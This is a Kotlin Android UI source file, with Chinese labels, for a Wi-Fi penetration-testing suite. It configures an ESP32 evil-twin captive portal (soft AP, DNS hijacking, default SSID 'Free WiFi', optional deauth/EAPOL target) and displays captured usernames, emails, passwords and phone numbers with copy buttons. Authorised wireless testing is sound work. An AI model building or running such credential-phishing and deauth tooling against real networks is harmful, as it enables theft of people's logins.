package com.swp81x.nrsuite.ui

import androidx.compose.foundation.BorderStroke
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.material.icons.filled.ContentCopy
import androidx.compose.material.icons.filled.Delete
import androidx.compose.material3.Tab
import androidx.compose.material3.TabRow
import androidx.compose.ui.platform.LocalClipboardManager
import androidx.compose.ui.platform.LocalContext
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Add
import androidx.compose.material.icons.filled.Remove
import androidx.compose.material.icons.filled.ExpandLess
import androidx.compose.material.icons.filled.ExpandMore
import androidx.compose.material.icons.filled.Lock
import androidx.compose.material.icons.filled.PlayArrow
import androidx.compose.material.icons.filled.Stop
import androidx.compose.material3.AlertDialog
import androidx.compose.material3.Button
import androidx.compose.material3.Card
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.LinearProgressIndicator
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedButton
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.Text
import androidx.compose.material3.TextButton
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableIntStateOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.saveable.rememberSaveable
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import com.swp81x.nrsuite.core.credentials.CapturedCredential
import com.swp81x.nrsuite.ui.util.copyWithToast
import com.swp81x.nrsuite.ui.components.HtmlUploadSection
import com.swp81x.nrsuite.ui.components.StatusIndicator
import com.swp81x.nrsuite.ui.theme.NrOutline
import com.swp81x.nrsuite.ui.theme.NrOnSurfaceVariant
import com.swp81x.nrsuite.ui.theme.StatusAmber
import com.swp81x.nrsuite.ui.theme.StatusGreen
import com.swp81x.nrsuite.ui.theme.StatusNeutral
import com.swp81x.nrsuite.ui.theme.StatusRed

private val MAC_REGEX = Regex("^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$")

@Composable
fun PortalScreen(
    connected: Boolean,
    running: Boolean,
    htmlSize: Int,
    htmlComplete: Boolean,
    activeSsid: String,
    activeChannel: Int,
    portalViews: Int,
    portalClients: Int,
    capturedData: Int,
    credentials: List<CapturedCredential>,
    selectedHtmlName: String?,
    htmlUploading: Boolean,
    htmlProgress: Int,
    eventLog: List<String>,
    onChooseHtml: () -> Unit,
    onClearHtml: () -> Unit,
    onClearEventLog: () -> Unit,
    onStart: (ssid: String, channel: Int, targetBssid: String) -> Unit,
    onStop: () -> Unit,
    modifier: Modifier = Modifier,
) {
    var configExpanded by rememberSaveable { mutableStateOf(true) }
    var ssid by rememberSaveable { mutableStateOf("Free WiFi") }
    var channel by rememberSaveable { mutableStateOf(6) }
    var targetBssid by rememberSaveable { mutableStateOf("") }
    var confirmStart by rememberSaveable { mutableStateOf(false) }

    LaunchedEffect(running) {
        if (running) configExpanded = false
    }

    val validTargetBssid = targetBssid.isBlank() || MAC_REGEX.matches(targetBssid.trim())

    var selectedTab by rememberSaveable { mutableIntStateOf(0) }
    val clipboardManager = LocalClipboardManager.current
    val context = LocalContext.current

    Box(modifier = modifier.fillMaxSize()) {
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(12.dp),
        ) {
            TabRow(selectedTabIndex = selectedTab) {
                Tab(
                    selected = selectedTab == 0,
                    onClick = { selectedTab = 0 },
                    text = { Text("概览") },
                )
                Tab(
                    selected = selectedTab == 1,
                    onClick = { selectedTab = 1 },
                    text = { Text("日志 (${eventLog.size})") },
                )
            }

            Spacer(Modifier.height(10.dp))

            if (selectedTab == 0) {
                Column(
                    modifier = Modifier
                        .weight(1f)
                        .verticalScroll(rememberScrollState()),
                ) {
                ConfigZone(
                    connected = connected,
                    running = running,
                    expanded = configExpanded,
                    ssid = ssid,
                    channel = channel,
                    targetBssid = targetBssid,
                    validTargetBssid = validTargetBssid,
                    selectedHtmlName = selectedHtmlName,
                    htmlUploading = htmlUploading,
                    htmlProgress = htmlProgress,
                    htmlComplete = htmlComplete,
                    onToggle = { configExpanded = !configExpanded },
                    onSsidChange = { ssid = it },
                    onChannelChange = { channel = it.coerceIn(1, 13) },
                    onTargetBssidChange = { targetBssid = it },
                    onChooseHtml = onChooseHtml,
                    onClearHtml = onClearHtml,
                )

                Spacer(Modifier.height(10.dp))

                ResultZone(
                    connected = connected,
                    running = running,
                    htmlSize = htmlSize,
                    htmlComplete = htmlComplete,
                    activeSsid = activeSsid,
                    activeChannel = activeChannel,
                    portalViews = portalViews,
                    portalClients = portalClients,
                    capturedData = capturedData,
                )

                if (credentials.isNotEmpty()) {
                    Spacer(Modifier.height(10.dp))
                    CapturedCredentialsZone(credentials)
                }
                }
            } else {
                Card(
                    modifier = Modifier
                        .fillMaxWidth()
                        .weight(1f),
                    colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surface),
                    shape = RoundedCornerShape(12.dp),
                ) {
                    Column(Modifier.fillMaxSize().padding(12.dp)) {
                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            verticalAlignment = Alignment.CenterVertically,
                        ) {
                            Text(
                                text = "Portal 事件日志",
                                style = MaterialTheme.typography.titleMedium,
                                fontWeight = FontWeight.SemiBold,
                                modifier = Modifier.weight(1f),
                            )
                            IconButton(
                                onClick = {
                                    clipboardManager.copyWithToast(
                                        context,
                                        eventLog.joinToString("\n"),
                                        "日志已复制",
                                    )
                                },
                                enabled = eventLog.isNotEmpty(),
                            ) {
                                Icon(Icons.Default.ContentCopy, contentDescription = "复制日志")
                            }
                            IconButton(
                                onClick = onClearEventLog,
                                enabled = eventLog.isNotEmpty(),
                            ) {
                                Icon(Icons.Default.Delete, contentDescription = "清空日志")
                            }
                        }
                        if (eventLog.isEmpty()) {
                            Text(
                                text = "暂无 Portal 事件。页面访问、客户端连接及 POST 表单数据将显示在此处。",
                                style = MaterialTheme.typography.bodySmall,
                                color = NrOnSurfaceVariant,
                            )
                        } else {
                            LazyColumn(
                                modifier = Modifier.fillMaxSize(),
                                verticalArrangement = Arrangement.spacedBy(4.dp),
                            ) {
                                items(eventLog.reversed()) { line ->
                                    Text(
                                        text = line,
                                        style = MaterialTheme.typography.bodySmall.copy(fontFamily = FontFamily.Monospace),
                                        color = NrOnSurfaceVariant,
                                    )
                                }
                            }
                        }
                    }
                }
            }
        }

        if (connected) {
            ModuleActionFab(
                onClick = {
                    if (running) {
                        onStop()
                    } else if (validTargetBssid) {
                        confirmStart = true
                    }
                },
                modifier = Modifier
                    .align(Alignment.BottomEnd)
                    .padding(20.dp),
                containerColor = if (running) StatusRed else MaterialTheme.colorScheme.primary,
                contentColor = MaterialTheme.colorScheme.onPrimary,
            ) {
                Icon(
                    imageVector = if (running) Icons.Default.Stop else Icons.Default.PlayArrow,
                    contentDescription = if (running) "停止 Portal" else "启动 Portal",
                )
            }
        }
    }

    if (confirmStart) {
        AlertDialog(
            onDismissRequest = { confirmStart = false },
            title = { Text("启动强制认证门户 (Captive Portal)？") },
            text = {
                Text(
                    "SSID: $ssid\n" +
                        "信道: $channel\n" +
                        if (targetBssid.isBlank()) {
                            "未选择自动 EAPOL 目标。"
                        } else {
                            "自动 EAPOL/Deauth 目标: $targetBssid"
                        } +
                        "\n\n请仅在您拥有或获得授权测试的网络与设备上部署。"
                )
            },
            confirmButton = {
                TextButton(
                    onClick = {
                        confirmStart = false
                        onStart(ssid.trim(), channel, targetBssid.trim())
                    },
                ) {
                    Text("启动")
                }
            },
            dismissButton = {
                TextButton(onClick = { confirmStart = false }) {
                    Text("取消")
                }
            },
        )
    }
}

@Composable
private fun ConfigZone(
    connected: Boolean,
    running: Boolean,
    expanded: Boolean,
    ssid: String,
    channel: Int,
    targetBssid: String,
    validTargetBssid: Boolean,
    selectedHtmlName: String?,
    htmlUploading: Boolean,
    htmlProgress: Int,
    htmlComplete: Boolean,
    onToggle: () -> Unit,
    onSsidChange: (String) -> Unit,
    onChannelChange: (Int) -> Unit,
    onTargetBssidChange: (String) -> Unit,
    onChooseHtml: () -> Unit,
    onClearHtml: () -> Unit,
) {
    Card(
        modifier = Modifier.fillMaxWidth(),
        colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surface),
        border = BorderStroke(0.5.dp, NrOutline),
        shape = RoundedCornerShape(12.dp),
    ) {
        Column(Modifier.padding(14.dp)) {
            Row(
                modifier = Modifier.fillMaxWidth(),
                verticalAlignment = Alignment.CenterVertically,
            ) {
                Icon(
                    imageVector = Icons.Default.Lock,
                    contentDescription = null,
                    tint = MaterialTheme.colorScheme.primary,
                    modifier = Modifier.size(24.dp),
                )
                Spacer(Modifier.width(10.dp))
                Column(Modifier.weight(1f)) {
                    Text(
                        text = "Portal 强制门户配置",
                        style = MaterialTheme.typography.titleMedium,
                        fontWeight = FontWeight.SemiBold,
                    )
                    Text(
                        text = if (running) "Portal 运行中" else "Soft AP + DNS 劫持 + HTTP 服务",
                        style = MaterialTheme.typography.bodySmall,
                        color = NrOnSurfaceVariant,
                    )
                }
                IconButton(onClick = onToggle) {
                    Icon(
                        imageVector = if (expanded) Icons.Default.ExpandLess else Icons.Default.ExpandMore,
                        contentDescription = if (expanded) "折叠" else "展开",
                    )
                }
            }

            if (expanded) {
                Column {
                    Spacer(Modifier.height(10.dp))
                    OutlinedTextField(
                        value = ssid,
                        onValueChange = onSsidChange,
                        modifier = Modifier.fillMaxWidth(),
                        enabled = !running,
                        label = { Text("SSID") },
                        singleLine = true,
                    )
                    Spacer(Modifier.height(8.dp))
                    NumberStepper(
                        label = "信道 (1–13)",
                        valueText = channel.toString(),
                        enabled = !running,
                        onDecrease = { onChannelChange(channel - 1) },
                        onIncrease = { onChannelChange(channel + 1) },
                    )

                    Spacer(Modifier.height(12.dp))
                    HtmlUploadSection(
                        selectedName = selectedHtmlName,
                        uploading = htmlUploading,
                        progress = htmlProgress,
                        completed = htmlComplete,
                        required = false,
                        enabled = !running,
                        onChoose = onChooseHtml,
                        onClear = onClearHtml,
                    )

                    if (!connected) {
                        Spacer(Modifier.height(10.dp))
                        Text(
                            text = "启动 Portal 前请先在“设备”页面连接硬件设备。",
                            style = MaterialTheme.typography.bodySmall,
                            color = StatusAmber,
                        )
                    }
                }
            }
        }
    }
}

@Composable
private fun NumberStepper(
    label: String,
    valueText: String,
    enabled: Boolean,
    onDecrease: () -> Unit,
    onIncrease: () -> Unit,
) {
    Row(
        modifier = Modifier.fillMaxWidth(),
        verticalAlignment = Alignment.CenterVertically,
    ) {
        Text(
            text = label,
            style = MaterialTheme.typography.labelLarge,
            modifier = Modifier.weight(1f),
        )
        IconButton(onClick = onDecrease, enabled = enabled) {
            Icon(
                imageVector = Icons.Default.Remove,
                contentDescription = "减小 $label",
            )
        }
        Text(
            text = valueText,
            style = MaterialTheme.typography.bodyMedium.copy(fontFamily = FontFamily.Monospace),
            modifier = Modifier.padding(horizontal = 8.dp),
        )
        IconButton(onClick = onIncrease, enabled = enabled) {
            Icon(
                imageVector = Icons.Default.Add,
                contentDescription = "增加 $label",
            )
        }
    }
}

@Composable
private fun CapturedCredentialsZone(credentials: List<CapturedCredential>) {
    val clipboard = LocalClipboardManager.current
    val context = LocalContext.current
    val latest = credentials.lastOrNull() ?: return
    val shownFields = latest.knownPortalFields()

    Card(
        modifier = Modifier.fillMaxWidth(),
        colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surface),
        border = BorderStroke(0.5.dp, NrOutline),
        shape = RoundedCornerShape(12.dp),
    ) {
        Column(Modifier.padding(14.dp)) {
            Row(verticalAlignment = Alignment.CenterVertically) {
                Icon(
                    imageVector = Icons.Default.Lock,
                    contentDescription = null,
                    tint = MaterialTheme.colorScheme.primary,
                    modifier = Modifier.size(20.dp),
                )
                Spacer(Modifier.width(8.dp))
                Text(
                    text = "已捕获凭据 (${credentials.size})",
                    style = MaterialTheme.typography.titleMedium,
                    fontWeight = FontWeight.SemiBold,
                )
            }
            Spacer(Modifier.height(6.dp))
            Text(
                text = "最新提交: ${latest.capturedAt}  ·  ${latest.details.size} 个字段",
                style = MaterialTheme.typography.bodySmall.copy(fontFamily = FontFamily.Monospace),
                color = NrOnSurfaceVariant,
            )

            Spacer(Modifier.height(6.dp))
            shownFields.forEach { (label, value) ->
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    verticalAlignment = Alignment.CenterVertically,
                ) {
                    Text(
                        text = "$label:",
                        style = MaterialTheme.typography.bodySmall,
                        color = NrOnSurfaceVariant,
                        modifier = Modifier.width(78.dp),
                    )
                    Text(
                        text = value,
                        style = MaterialTheme.typography.bodyMedium.copy(fontFamily = FontFamily.Monospace),
                        color = if (label == "Password" || label == "密码") StatusGreen else MaterialTheme.colorScheme.onSurface,
                        modifier = Modifier.weight(1f),
                    )
                    IconButton(onClick = { clipboard.copyWithToast(context, value) }) {
                        Icon(
                            imageVector = Icons.Default.ContentCopy,
                            contentDescription = "复制 $label",
                            tint = NrOnSurfaceVariant,
                        )
                    }
                }
            }

            val extraFields = (latest.details.size - shownFields.size).coerceAtLeast(0)
            if (extraFields > 0) {
                Text(
                    text = "还有 +$extraFields 个字段可在“凭据管理”· Portal 筛选中查看。",
                    style = MaterialTheme.typography.bodySmall,
                    color = NrOnSurfaceVariant,
                )
            } else {
                Text(
                    text = "完整提交记录可在“凭据管理”· Portal 筛选中查看。",
                    style = MaterialTheme.typography.bodySmall,
                    color = NrOnSurfaceVariant,
                )
            }
        }
    }
}

private fun CapturedCredential.knownPortalFields(): List<Pair<String, String>> {
    val known = listOf(
        "用户名" to listOf("username", "user", "login"),
        "邮箱" to listOf("email", "mail"),
        "密码" to listOf("password", "pass"),
        "手机号" to listOf("phone", "mobile"),
    )
    val fields = linkedMapOf<String, String>()
    known.forEach { (label, keys) ->
        keys.forEach { key ->
            val value = details.entries.firstOrNull { it.key.equals(key, ignoreCase = true) }?.value
            if (!value.isNullOrBlank()) {
                fields.putIfAbsent(label, value)
                return@forEach
            }
        }
    }

    if (fields.isEmpty()) {
        fields["值"] = value
    }
    return fields.entries.map { it.key to it.value }
}

@Composable
private fun ResultZone(
    connected: Boolean,
    running: Boolean,
    htmlSize: Int,
    htmlComplete: Boolean,
    activeSsid: String,
    activeChannel: Int,
    portalViews: Int,
    portalClients: Int,
    capturedData: Int,
    modifier: Modifier = Modifier,
) {
    Card(
        modifier = modifier.fillMaxWidth(),
        colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surface),
        border = BorderStroke(0.5.dp, NrOutline),
        shape = RoundedCornerShape(12.dp),
    ) {
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(16.dp),
        ) {
            Text(
                text = "Portal 运行状态",
                style = MaterialTheme.typography.titleMedium,
                fontWeight = FontWeight.SemiBold,
            )
            Spacer(Modifier.height(8.dp))
            StatusIndicator(
                label = when {
                    !connected -> "未连接设备"
                    running -> "Portal 运行中"
                    activeSsid.isNotBlank() -> "已停止"
                    else -> "就绪"
                },
                color = when {
                    !connected -> StatusNeutral
                    running -> StatusGreen
                    activeSsid.isNotBlank() -> StatusAmber
                    else -> StatusNeutral
                },
            )

            if (activeSsid.isNotBlank()) {
                Spacer(Modifier.height(8.dp))
                Text(
                    text = "SSID: $activeSsid",
                    style = MaterialTheme.typography.bodySmall.copy(fontFamily = FontFamily.Monospace),
                    color = NrOnSurfaceVariant,
                )
                if (activeChannel > 0) {
                    Text(
                        text = "信道: $activeChannel",
                        style = MaterialTheme.typography.bodySmall.copy(fontFamily = FontFamily.Monospace),
                        color = NrOnSurfaceVariant,
                    )
                }
            }

            if (running || activeSsid.isNotBlank()) {
                Spacer(Modifier.height(16.dp))
                MetricRow("页面访问次数", portalViews.toString())
                MetricRow("关联客户端数", portalClients.toString())
                MetricRow("已捕获表单数", capturedData.toString())
            }

            if (!connected) {
                Spacer(Modifier.height(24.dp))
                Text(
                    text = "请先连接 ESP32 设备以启动强制门户。",
                    style = MaterialTheme.typography.bodySmall,
                    color = NrOnSurfaceVariant,
                )
            } else if (!running) {
                Spacer(Modifier.height(24.dp))
                Text(
                    text = "配置 AP 参数，可选上传自定义 HTML 页面，然后点击启动。",
                    style = MaterialTheme.typography.bodySmall,
                    color = NrOnSurfaceVariant,
                )
            }
        }
    }
}

@Composable
private fun MetricRow(label: String, value: String) {
    Row(
        modifier = Modifier
            .fillMaxWidth()
            .padding(vertical = 3.dp),
        verticalAlignment = Alignment.CenterVertically,
    ) {
        Text(
            text = label,
            style = MaterialTheme.typography.bodySmall,
            color = NrOnSurfaceVariant,
            modifier = Modifier.weight(1f),
        )
        Text(
            text = value,
            style = MaterialTheme.typography.bodyMedium.copy(fontFamily = FontFamily.Monospace),
            fontWeight = FontWeight.Medium,
        )
    }
}
